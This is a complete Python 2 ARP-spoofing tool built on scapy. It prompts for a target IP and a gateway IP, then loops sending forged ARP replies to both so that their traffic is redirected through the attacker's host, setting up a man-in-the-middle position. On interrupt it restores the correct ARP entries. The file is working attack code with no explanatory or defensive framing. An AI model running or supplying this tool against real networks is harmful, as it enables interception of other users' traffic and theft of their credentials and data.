#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    
    return answer_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    try:
        tagret_mac = get_mac(target_ip)
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = tagret_mac, psrc = spoof_ip)
        scapy.send(packet, verbose = False)
    except IndexError:
        pass

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

targeted_ip = raw_input("Target IP: ")
gateway_ip = raw_input("Gateway IP: ")

sent_packet_count = 0
try:
    while True:
        spoof(targeted_ip, gateway_ip)
        spoof(gateway_ip, targeted_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Stopped ARP spoof")
    restore(targeted_ip, gateway_ip)
    restore(gateway_ip, targeted_ip)
    print("\n[+] Restored")

